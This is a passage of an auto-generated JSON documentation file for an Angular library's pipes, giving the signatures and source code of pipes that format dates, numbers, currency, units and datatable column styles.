{
  "pipes": [
    {
      "name": "ActivePreferencePipe",
      "id": "pipe-ActivePreferencePipe-76317913332fa8e34f0bdbb94e86444ce7a67faaf6b71725c123c35259b94d23e525044381800d3700826c440b9c4d9c7e447ef84def1233721c2b037065b6bc",
      "file": "libs/common/src/lib/preference-manager/active-preference.pipe.ts",
      "type": "pipe",
      "deprecated": false,
      "deprecationMessage": "",
      "description": "",
      "rawdescription": "\n",
      "properties": [],
      "methods": [
        {
          "name": "transform",
          "args": [
            {
              "name": "preferences",
              "type": "Preference[]",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "activePreferenceId",
              "type": "string | null",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "Preference | null",
          "typeParameters": [],
          "line": 9,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "preferences",
              "type": "Preference[]",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "activePreferenceId",
              "type": "string | null",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "ngname": "activePreference",
      "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\nimport { Preference } from './preference';\n\n@Pipe({\n  name: 'activePreference'\n})\nexport class ActivePreferencePipe implements PipeTransform {\n\n  transform(preferences: Preference[], activePreferenceId: string | null): Preference | null {\n    let active: Preference | undefined;\n    if ( !preferences ) {\n      return null;\n    }\n    if ( activePreferenceId ) {\n      active = preferences.find(p => p.id === activePreferenceId);\n    }\n    return active ?? null;\n  }\n\n}\n"
    },
    {
      "name": "ColumnStylePipe",
      "id": "pipe-ColumnStylePipe-236e838bdb1b198f010ca19fbb67ee7d461edf4a4869209927e0c0391850f9992213282008f715e44fc6508155bce982a0ef4570baac5baec8e40134125f069a",
      "file": "libs/datatable/src/lib/sto-datatable/column-style.pipe.ts",
      "type": "pipe",
      "deprecated": false,
      "deprecationMessage": "",
      "description": "",
      "rawdescription": "\n",
      "properties": [],
      "methods": [
        {
          "name": "transform",
          "args": [
            {
              "name": "column",
              "type": "Column",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "displayMode",
              "type": "ColumnDisplay",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "width",
              "type": "number | null",
              "deprecated": false,
              "deprecationMessage": "",
              "optional": true
            }
          ],
          "optional": false,
          "returnType": "literal type",
          "typeParameters": [],
          "line": 9,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "column",
              "type": "Column",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "displayMode",
              "type": "ColumnDisplay",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "width",
              "type": "number | null",
              "deprecated": false,
              "deprecationMessage": "",
              "optional": true,
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "ngname": "columnStyle",
      "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\nimport { Column, ColumnDisplay } from './columns';\n\n@Pipe({\n  name: 'columnStyle'\n})\nexport class ColumnStylePipe implements PipeTransform {\n\n  transform(column: Column, displayMode: ColumnDisplay, width?: number | null): {[klass: string]: unknown;} {\n    switch ( displayMode ) {\n      case ColumnDisplay.Force:\n        return {\n          'width.px': width || ( column.flexBasis || 80 ),\n          'maxWidth.px': width || ( column.flexBasis || 80 ),\n          float: 'left'\n        };\n      case ColumnDisplay.Flex:\n      default:\n        return {\n          flexGrow: ( column.flexGrow || column.flexGrow === 0 ) ? column.flexGrow : 1,\n          flexShrink: ( column.flexShrink || column.flexShrink === 0 ) ? column.flexShrink : 1,\n          'flexBasis.px': width || ( column.flexBasis || 80 ),\n        };\n    }\n  }\n\n}\n\n/*         [style.flex-grow]=\"(column.flexGrow || column.flexGrow === 0) ? column.flexGrow : 1\"\n         [style.flex-shrink]=\"(column.flexShrink || column.flexShrink === 0) ? column.flexShrink : 1\"\n         [style.flex-basis.px]=\"headerWidthMap[i] || (column.flexBasis || 80)\"*/\n"
    },
    {
      "name": "CurrencyFormatPipe",
      "id": "pipe-CurrencyFormatPipe-2ef0eae5f11bbbbd26d7c2983576d263a108a3e9f998a4bdcd4059852c5eee9f082e5d4caf746a8d0b5fd8cdddc2ea0e09311e1ee846fb5901621c7ddd3eee17",
      "file": "libs/core/src/lib/sto-pipes/currency-format.pipe.ts",
      "type": "pipe",
      "deprecated": false,
      "deprecationMessage": "",
      "description": "<p>Pipe used to transform numbers to a currency format</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\"></code></pre></div><p><span>{{ 5000.5824 | currentFormat:&#39;$&#39;:3 }}</span>\nResults in\n<span>5 000,582 $</span></p>\n",
      "rawdescription": "\n\nPipe used to transform numbers to a currency format\n\n```html\n```\n<span>{{ 5000.5824 | currentFormat:'$':3 }}</span>\nResults in\n<span>5 000,582 $</span>\n",
      "properties": [],
      "methods": [
        {
          "name": "transform",
          "args": [
            {
              "name": "value",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "unit",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "''"
            },
            {
              "name": "maximumFractionDigits",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "3"
            }
          ],
          "optional": false,
          "returnType": "string | null",
          "typeParameters": [],
          "line": 16,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "value",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "unit",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "''",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "maximumFractionDigits",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "3",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "ngname": "currencyFormat",
      "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\n\n/**\n  * Pipe used to transform numbers to a currency format\n  *\n  * @example\n  *\n  * <span>{{ 5000.5824 | currentFormat:'$':3 }}</span>\n  * Results in\n  * <span>5 000,582 $</span>\n  */\n@Pipe({\n  name: 'currencyFormat'\n})\nexport class CurrencyFormatPipe implements PipeTransform {\n  transform(value: number, unit: string = '', maximumFractionDigits = 3): string | null {\n    if (!value) {\n      return null;\n    }\n    if (typeof value === 'string') {\n      value = parseFloat(value);\n      if (isNaN(value)) {\n        return '';\n      }\n    }\n\n    const intl = new Intl.NumberFormat('en-US', {maximumFractionDigits}).format(value);\n    return intl.replace(/,/g, ' ').replace('.', ',') + ` ${unit}`;\n  }\n}\n\n"
    },
    {
      "name": "DateFormatPipe",
      "id": "pipe-DateFormatPipe-b47c6bdc40c67d1421752985cd2291ee6af6a9e06e71f7773ab44d94c393e3b97376c30c733a1e28e6be0a25608927d905db2e9a981ea103c5c028b9a8f09f2d",
      "file": "libs/core/src/lib/sto-pipes/date-format.pipe.ts",
      "type": "pipe",
      "deprecated": false,
      "deprecationMessage": "",
      "description": "<p>Pipe used to transform dates, based on our default formats.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\"></code></pre></div><p>public date = &quot;2018-08-27 14:00:30&quot;\n<span>{{ date | dateFormat }}</span> -&gt; Aug 27, 2018\n<span>{{ date | dateFormat:&#39;long&#39; }}</span> -&gt; Monday Aug 27, 2018</p>\n",
      "rawdescription": "\n\nPipe used to transform dates, based on our default formats.\n\n```html\n```\npublic date = \"2018-08-27 14:00:30\"\n<span>{{ date | dateFormat }}</span> -> Aug 27, 2018\n<span>{{ date | dateFormat:'long' }}</span> -> Monday Aug 27, 2018\n",
      "properties": [],
      "methods": [
        {
          "name": "transform",
          "args": [
            {
              "name": "value",
              "type": "string | number | Date | null",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "format",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": "",
              "optional": true
            }
          ],
          "optional": false,
          "returnType": "string | null",
          "typeParameters": [],
          "line": 19,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "value",
              "type": "string | number | Date | null",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "format",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": "",
              "optional": true,
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "ngname": "formatDate",
      "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\nimport { format as formatDate, isValid, parseISO } from 'date-fns';\n\n/**\n * Pipe used to transform dates, based on our default formats.\n *\n * @example\n *\n * public date = \"2018-08-27 14:00:30\"\n * <span>{{ date | dateFormat }}</span> -> Aug 27, 2018\n * <span>{{ date | dateFormat:'long' }}</span> -> Monday Aug 27, 2018\n */\n\n@Pipe({\n  name: 'formatDate'\n})\nexport class DateFormatPipe implements PipeTransform {\n\n  transform(value: string | number | Date | null, format?: string): string | null {\n    if (!value) {\n      return null;\n    }\n    if (typeof value === 'string') {\n      const originalValue = value;\n      value = parseISO(value);\n      if ( !isValid(value) ) {\n        // If invalid ISO date (e.g single-digit day), fall back to new Date()\n        console.warn(`${originalValue} is not a valid ISO date string, falling back to native date`);\n        value = new Date(originalValue);\n      }\n    }\n    switch (format) {\n      case 'long':\n        return formatDate(value, 'EEEE MMM d, yyyy');\n      case 'short':\n        return formatDate(value, 'yyyy-MM-dd');\n      case 'datetime':\n        return formatDate(value, 'MMM d, yyyy, HH:mm');\n      case 'datetimezone':\n        return formatDate(value, `MMM d, yyyy, HH:mm:ss ('UTC'xxx)`);\n      case 'datetime-long':\n        return formatDate(value, 'EEEE MMM dd, yyyy, HH:mm');\n      case 'datetime-short':\n        return formatDate(value, 'yyyy-MM-dd, HH:mm');\n      default:\n        return formatDate(value, 'MMM d, yyyy');\n    }\n  }\n\n}\n"
    },
    {
      "name": "ExcludeUnit",
      "id": "pipe-ExcludeUnit-c27414f0ebabd9684e286b2a6d249f8aaea10713d78d2287f5b3fd6884773215e85a354af64afd962f6df05c571525bec700d34da66bedd47d95d03b717b69ad",
      "file": "libs/core/src/lib/sto-pipes/with-unit.ts",
      "type": "pipe",
      "deprecated": false,
      "deprecationMessage": "",
      "description": "",
      "rawdescription": "\n",
      "properties": [],
      "methods": [
        {
          "name": "transform",
          "args": [
            {
              "name": "value",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "string",
          "typeParameters": [],
          "line": 22,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "value",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "ngname": "excludeUnit",
      "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\n\n@Pipe({name: 'getUnit'})\nexport class GetUnit implements PipeTransform {\n  transform(value: string, withParens?: boolean): string {\n    if (value) {\n      const arr = value.split('(');\n      if (arr.length > 0 ) {\n        if (withParens) {\n          value = '(' + arr[1];\n        } else {\n          arr[1].slice(0, -1);\n          value = arr[1].slice(0, -1);\n        }\n      }\n    }\n    return value;\n  }\n}\n@Pipe({name: 'excludeUnit'})\nexport class ExcludeUnit implements PipeTransform {\n  transform(value: string): string {\n    if (value) {\n      const arr = value.split('(');\n      if (arr.length > 0) {\n        value = arr[0];\n      }\n    }\n    return value;\n  }\n}\n"
    },
    {
      "name": "ExecPipe",
      "id": "pipe-ExecPipe-5a078581e65f3196cc0b434c5e04d0d3bbfc6119af5dbce6d765994ba4e18ec7a272815a50f9f15494c55ffd0038185834f98f8de0f7a2ae724a22e6ad735076",
      "file": "libs/datatable/src/lib/sto-datatable/exec.pipe.ts",
      "type": "pipe",
      "deprecated": false,
      "deprecationMessage": "",
      "description": "",
      "rawdescription": "\n",
      "properties": [],
      "methods": [
        {
          "name": "transform",
          "args": [
            {
              "name": "func",
              "type": " | R",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "value",
              "type": "",
              "deprecated": false,
              "deprecationMessage": "",
              "optional": true
            },
            {
              "name": "column",
              "type": "Column",
              "deprecated": false,
              "deprecationMessage": "",
              "optional": true
            },
            {
              "name": "row",
              "type": "T",
              "deprecated": false,
              "deprecationMessage": "",
              "optional": true
            }
          ],
          "optional": false,
          "returnType": "R | null",
          "typeParameters": [],
          "line": 10,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "func",
              "type": " | R",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "value",
              "type": "",
              "deprecated": false,
              "deprecationMessage": "",
              "optional": true,
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "column",
              "type": "Column",
              "deprecated": false,
              "deprecationMessage": "",
              "optional": true,
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "row",
              "type": "T",
              "deprecated": false,
              "deprecationMessage": "",
              "optional": true,
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "ngname": "exec",
      "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\nimport { Column } from './columns';\n\n@Pipe({\n  name: 'exec'\n})\n// eslint-disable-next-line @typescript-eslint/no-explicit-any\nexport class ExecPipe<T = unknown, R = any> implements PipeTransform/*, Exec<T>*/ {\n\n  transform(func: ( (...args: unknown[]) => R ) | R, value?: unknown, column?: Column, row?: T): R | null {\n    if ( func && typeof func === 'function' ) {\n      return ( func as (...args: unknown[]) => R )(value, row, column);\n    } else if ( typeof func === 'string' ) {\n      return func;\n    }\n    return null;\n  }\n\n}\n"
    },
    {
      "name": "GetGroupFlexPipe",
      "id": "pipe-GetGroupFlexPipe-865b51ad6069b2f7f2a7f37441ee491b2dc9bc263f18158e6b513fcc1b1a4f40d5ab95bddcde3ad9b2e8aa97f05173f2dae0e78b574f0e6f2616684182c571a7",
      "file": "libs/datatable/src/lib/sto-datatable/get-group-flex.pipe.ts",
      "type": "pipe",
      "deprecated": false,
      "deprecationMessage": "",
      "description": "",
      "rawdescription": "\n",
      "properties": [],
      "methods": [
        {
          "name": "transform",
          "args": [
            {
              "name": "group",
              "type": "Group",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "columns",
              "type": "Array<Column>",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "string",
          "typeParameters": [],
          "line": 9,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "group",
              "type": "Group",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "columns",
              "type": "Array<Column>",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "ngname": "getGroupFlex",
      "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\nimport { Column, Group } from './columns';\n\n@Pipe({\n  name: 'getGroupFlex'\n})\nexport class GetGroupFlexPipe implements PipeTransform {\n\n  transform(group: Group, columns: Array<Column>): string {\n    const basis = group.props\n      .map(g => columns.find(c => c.prop === g))\n      .map(c => c?.flexBasis || 80)\n      .reduce((a, b) => a + b, 0);\n    const grow = group.props.length;\n    return `${grow} 1 ${basis}px`;\n  }\n\n}\n"
    },
    {
      "name": "GetUnit",
      "id": "pipe-GetUnit-c27414f0ebabd9684e286b2a6d249f8aaea10713d78d2287f5b3fd6884773215e85a354af64afd962f6df05c571525bec700d34da66bedd47d95d03b717b69ad",
      "file": "libs/core/src/lib/sto-pipes/with-unit.ts",
      "type": "pipe",
      "deprecated": false,
      "deprecationMessage": "",
      "description": "",
      "rawdescription": "\n",
      "properties": [],
      "methods": [
        {
          "name": "transform",
          "args": [
            {
              "name": "value",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "withParens",
              "type": "boolean",
              "deprecated": false,
              "deprecationMessage": "",
              "optional": true
            }
          ],
          "optional": false,
          "returnType": "string",
          "typeParameters": [],
          "line": 5,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "value",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "withParens",
              "type": "boolean",
              "deprecated": false,
              "deprecationMessage": "",
              "optional": true,
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "ngname": "getUnit",
      "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\n\n@Pipe({name: 'getUnit'})\nexport class GetUnit implements PipeTransform {\n  transform(value: string, withParens?: boolean): string {\n    if (value) {\n      const arr = value.split('(');\n      if (arr.length > 0 ) {\n        if (withParens) {\n          value = '(' + arr[1];\n        } else {\n          arr[1].slice(0, -1);\n          value = arr[1].slice(0, -1);\n        }\n      }\n    }\n    return value;\n  }\n}\n@Pipe({name: 'excludeUnit'})\nexport class ExcludeUnit implements PipeTransform {\n  transform(value: string): string {\n    if (value) {\n      const arr = value.split('(');\n      if (arr.length > 0) {\n        value = arr[0];\n      }\n    }\n    return value;\n  }\n}\n"
    },
    {
      "name": "KeysPipe",
      "id": "pipe-KeysPipe-20ce5bfc30b14920319bdec7f5bb9b5e40a39e009744481b7b5bc93af6bac6ebf6d58669e253de74e059f109aee9dc27f9c35a1b0acc36dc27faf085579b1760",
      "file": "libs/core/src/lib/sto-pipes/keys.pipe.ts",
      "type": "pipe",
      "deprecated": false,
      "deprecationMessage": "",
      "description": "<p>Transforms an Object to an Array.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\"></code></pre></div><p>public obj = {a: 1, b: 2, c: 3};\n&lt;span *ngFor=&quot;let key of obj | keys &quot;&gt; {{ obj[key] }}, </span> -&gt; 1, 2, 3,</p>\n",
      "rawdescription": "\n\nTransforms an Object to an Array.\n\n```html\n```\npublic obj = {a: 1, b: 2, c: 3};\n<span *ngFor=\"let key of obj | keys \"> {{ obj[key] }}, </span> -> 1, 2, 3,\n",
      "properties": [],
      "methods": [
        {
          "name": "transform",
          "args": [
            {
              "name": "value",
              "type": "Record<string | >",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "Array<string>",
          "typeParameters": [],
          "line": 17,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "value",
              "type": "Record<string | >",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "ngname": "keys",
      "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\n\n/**\n * Transforms an Object to an Array.\n *\n * @example\n *\n * public obj = {a: 1, b: 2, c: 3};\n * <span *ngFor=\"let key of obj | keys \"> {{ obj[key] }}, </span> -> 1, 2, 3,\n */\n\n@Pipe({\n  name: 'keys'\n})\nexport class KeysPipe implements PipeTransform {\n\n  transform(value: Record<string, unknown>): Array<string> {\n    if (value) {\n      return Object.keys(value);\n    }\n    return [];\n  }\n\n}\n"
    },
    {
      "name": "NumberFormatPipe",
      "id": "pipe-NumberFormatPipe-0ce4edb78866512d03b7edd38de553c7da788540c0bb393dc3238a3c8ab92473792e5d913dd547cbcc378229f927a2dc2d298e84a5fe759f2f5368fd4f48638e",
      "file": "libs/core/src/lib/sto-pipes/number-format.pipe.ts",
      "type": "pipe",
      "deprecated": false,
      "deprecationMessage": "",
      "description": "<p>Formats numbers to use our standard formatting (d ddd,ddd)</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\"></code></pre></div><p>{{ 1234,32 | numberFormat }} -&gt; 1 234,320\n{{ 1234,32 | numberFormat:&#39;M3&#39; }} -&gt; 1 234,320 M3\n{{ -1234,32 | numberFormat:&#39;M3&#39;:true }} -&gt; 1 234,320 M3\n{{ 1234,32 | numberFormat:&#39;M3&#39;:false:false }} -&gt; 1 234 M3\n{{ 1234,32 | numberFormat:&#39;M3&#39;:false:true:5 }} -&gt; 1 234,32000 M3</p>\n",
      "rawdescription": "\n\nFormats numbers to use our standard formatting (d ddd,ddd)\n\n```html\n```\n{{ 1234,32 | numberFormat }} -> 1 234,320\n{{ 1234,32 | numberFormat:'M3' }} -> 1 234,320 M3\n{{ -1234,32 | numberFormat:'M3':true }} -> 1 234,320 M3\n{{ 1234,32 | numberFormat:'M3':false:false }} -> 1 234 M3\n{{ 1234,32 | numberFormat:'M3':false:true:5 }} -> 1 234,32000 M3\n",
      "properties": [],
      "methods": [
        {
          "name": "prettyPrintValue",
          "args": [
            {
              "name": "value",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "appendDecimals",
              "type": "boolean",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "numberOfDecimals",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "any",
          "typeParameters": [],
          "line": 53,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            121
          ],
          "jsdoctags": [
            {
              "name": "value",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "appendDecimals",
              "type": "boolean",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "numberOfDecimals",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "toFixed",
          "args": [
            {
              "name": "num",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "precision",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "any",
          "typeParameters": [],
          "line": 68,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            121
          ],
          "jsdoctags": [
            {
              "name": "num",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "precision",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "transform",
          "args": [
            {
              "name": "value",
              "type": "number | string",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "unit",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "''"
            },
            {
              "name": "abs",
              "type": "boolean",
              "deprecated": false,
              "deprecationMessage": "",
              "optional": true
            },
            {
              "name": "appendDecimals",
              "type": "",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "true"
            },
            {
              "name": "numberOfDecimals",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "3"
            }
          ],
          "optional": false,
          "returnType": "string | null",
          "typeParameters": [],
          "line": 19,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "value",
              "type": "number | string",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "unit",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "''",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "abs",
              "type": "boolean",
              "deprecated": false,
              "deprecationMessage": "",
              "optional": true,
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "appendDecimals",
              "type": "",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "true",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "numberOfDecimals",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "3",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "ngname": "numberFormat",
      "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\n\n/**\n * Formats numbers to use our standard formatting (d ddd,ddd)\n *\n * @example\n *\n * {{ 1234,32 | numberFormat }} -> 1 234,320\n * {{ 1234,32 | numberFormat:'M3' }} -> 1 234,320 M3\n * {{ -1234,32 | numberFormat:'M3':true }} -> 1 234,320 M3\n * {{ 1234,32 | numberFormat:'M3':false:false }} -> 1 234 M3\n * {{ 1234,32 | numberFormat:'M3':false:true:5 }} -> 1 234,32000 M3\n */\n@Pipe({\n  name: 'numberFormat'\n})\nexport class NumberFormatPipe implements PipeTransform {\n\n  transform(value: number | string, unit: string = '', abs?: boolean, appendDecimals = true, numberOfDecimals = 3): string | null {\n    if ( value !== 0 && !value ) {\n      return '';\n    }\n    if ( typeof value === 'string' ) {\n      const newValue = parseFloat(value);\n      if ( isNaN(newValue) ) {\n        return null;\n      }\n      value = newValue;\n    }\n    if ( abs ) {\n      value = Math.abs(value);\n    }\n    // We absolute the value to ensure that the rounding rules is always away from zero.\n    // 1.5 => 2 and -1.5 => -2\n    const isNegativeNumber = value < 0;\n    value = Math.abs(value);\n\n    if ( !appendDecimals ) {\n      value = Math.round(value);\n    }\n    if ( !isNaN(value) && appendDecimals ) {\n      value = parseFloat(this.toFixed(value, numberOfDecimals));\n    }\n    // Turn negative numbers back, but only if value is not -0\n    // eslint-disable-next-line no-compare-neg-zero\n    if ( isNegativeNumber && value !== -0 ) {\n      value = value * -1;\n    }\n    const localized = this.prettyPrintValue(value, appendDecimals, numberOfDecimals);\n    return localized.replace(/,/g, ' ').replace('.', ',') + `${unit ? ' ' + unit : ''}`;\n  }\n\n  private prettyPrintValue(value: number, appendDecimals: boolean, numberOfDecimals: number) {\n    const intlOptions = { minimumFractionDigits: numberOfDecimals, maximumFractionDigits: numberOfDecimals };\n    const intl = new Intl.NumberFormat('en-US', intlOptions).format(value);\n    const split = intl.split('.');\n    let localized = split[ 0 ];\n\n    if ( appendDecimals ) {\n      const decimals = split.length === 2 ? split[ 1 ] : '';\n      split[ 1 ] = decimals.padEnd(numberOfDecimals, '0');\n      localized = split.join('.');\n    }\n    return localized;\n  }\n\n  // Normal toFixed has some issues: https://stackoverflow.com/questions/10015027/javascript-tofixed-not-rounding\n  private toFixed(num: number, precision: number) {\n    // This method also has some issues - namely, it's unable to parse negative numbers with huge floating points\n    // -8.185452315956354e-12 becomes NaN\n    let returnValue = ( +( Math.round(+( num + 'e' + precision )) + 'e' + -precision ) );\n    if ( isNaN(returnValue) ) {\n      returnValue = parseFloat(num.toFixed(precision));\n    }\n    return returnValue.toFixed(precision);\n  }\n}\n"
    },
    {
      "name": "NumberInputPipe",
      "id": "pipe-NumberInputPipe-afbdb92e08c34bcf254361e96d095a6ab4713dd256a1d77119a083c67ff3d8afcfc1c7e4cea394cf869da21b232abdc6cda5b9afddecc8c0a9c1221c3ddb431a",
      "file": "libs/form/src/lib/number-input/number-input.pipe.ts",
      "type": "pipe",
      "deprecated": false,
      "deprecationMessage": "",
      "description": "",
      "rawdescription": "\n",
      "properties": [
        {
          "name": "DECIMAL_SEPARATOR",
          "defaultValue": "','",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 8,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "THOUSANDS_SEPARATOR",
          "defaultValue": "' '",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 9,
          "modifierKind": [
            121
          ]
        }
      ],
      "methods": [
        {
          "name": "handleIntegerAndFractions",
          "args": [
            {
              "name": "integer",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "fraction",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "fractionSize",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "dynamicFractionSize",
              "type": "",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "false"
            }
          ],
          "optional": false,
          "returnType": "{ integer: string; fraction: string; }",
          "typeParameters": [],
          "line": 11,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            121
          ],
          "jsdoctags": [
            {
              "name": "integer",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "fraction",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "fractionSize",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "dynamicFractionSize",
              "type": "",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "false",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "parse",
          "args": [
            {
              "name": "value",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "fractionSize",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "5"
            },
            {
              "name": "dynamicFractionSize",
              "type": "",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "false"
            }
          ],
          "optional": false,
          "returnType": "string",
          "typeParameters": [],
          "line": 73,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "value",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "fractionSize",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "5",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "dynamicFractionSize",
              "type": "",
              "deprecated": false,
              "deprecationMessage": "",
              "defaultValue": "false",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "transform",
          "args": [
            {
              "name": "value",
              "type": "number | string | null",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "fractionSize",
              "type": "number",
